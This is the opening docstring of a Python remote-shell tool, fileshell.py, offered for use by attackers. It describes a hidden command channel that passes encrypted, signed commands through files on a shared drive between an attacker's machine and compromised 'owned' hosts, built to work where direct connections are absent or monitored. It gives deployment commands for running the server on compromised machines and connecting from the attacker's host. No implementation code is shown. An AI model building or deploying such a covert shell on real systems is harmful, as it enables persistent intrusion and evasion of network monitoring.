#!/usr/bin/env python

'''
fileshell.py -- a File-IO based remote shell, for use where there is no direct communication
				channel between the attacker and the owned target, but they can communicate
				by writing and reading files to/from a remote share/file server etc, or where other forms 
				of communication are monitored.

				Tested to work on python 2.7.

				Composed of a single client (runs on attacker machine) and one or more servers
				(run on compromised machines). Currently you *must* start the server before running the client!
				Sample workflow:

				1. on host <owned1>, run 'python path\to\fileshell.py \\fileshare\myshare -s
				2. on host <owned2>, run 'python path\to\fileshell.py \\fileshare\myshare -s
				2. on your computer <h4x0r>, run 'python path\to\fileshell.py \\fileshare\myshare -c owned1

				This will look like a usual shell from the client side, but behind the scenes it negotiates
				symmetric encryption and signing keys via DH exchange, then for every command sent and every
				output returned, it encrypts/decrypts via AES-CTR-128 and signs/verifies via HMAC-SHA256
				with the derived keys. 
				All communications, including the key exchange, are done over files	in the given root share
				(the server will create a folder for its target the first time it runs).
				The users (or computer accounts, if running as SYSTEM) running these scripts must have
				read+write+modify access to the given share.

				Features:
				1. Client-server communication starts with a DH handshake for every new session, generating an encryption and a signing key.
				2. All communications after the handshake are AES-128 encrypted with the generated
				encryption key, and signed using HMAC-SHA256 with the signing key.
				3. Client side features shell-like behaviour, with extra commands:
					a. cc <hostname>: changes context (starts new session) to that of hostname.
					b. exit: exits current session gracefully.

				Dependencies:
				1. PyCrypto for Python 2.7 (tested to work on PyCrypto v2.6)
'''

